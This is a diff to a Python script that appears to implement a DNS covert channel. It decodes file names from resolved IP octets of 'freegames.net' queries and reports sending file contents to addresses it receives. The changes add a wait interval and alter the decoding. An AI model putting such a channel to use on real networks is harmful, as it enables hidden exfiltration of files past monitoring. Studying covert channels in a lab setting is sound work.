@@ -4,6 +4,8 @@ import sys
 import time
 import os
 
+WAIT_TIME = 10
+
 if (len(sys.argv) != 2):
     print("Usage: server.py {ip to send to}")
     exit
@@ -65,7 +67,9 @@ def resolveFileName(ips):
         for entry in ipSplit:
             characters.append(entry)
     for character in characters:
-        fileName = fileName + chr(character)
+        if character == "3":
+            break
+        fileName = fileName + chr(int(character))
         
     return fileName
 
@@ -75,6 +79,8 @@ resp, _ = sock.recvfrom(512)
 
 ips = getResponse(resp)
 print("Resolved IPs:", ips)
+
+time.sleep(WAIT_TIME)
 
 while True:
     sock.sendto(makeQuery("freegames.net"), (SERVER, 53))
@@ -127,4 +133,4 @@ while True:
             if not ((address == "100.100.100.100") and (port == 100)):
                 print(f"Sending file contents to {address}:{port}") 
             
-    time.sleep(10)
+    time.sleep(WAIT_TIME)
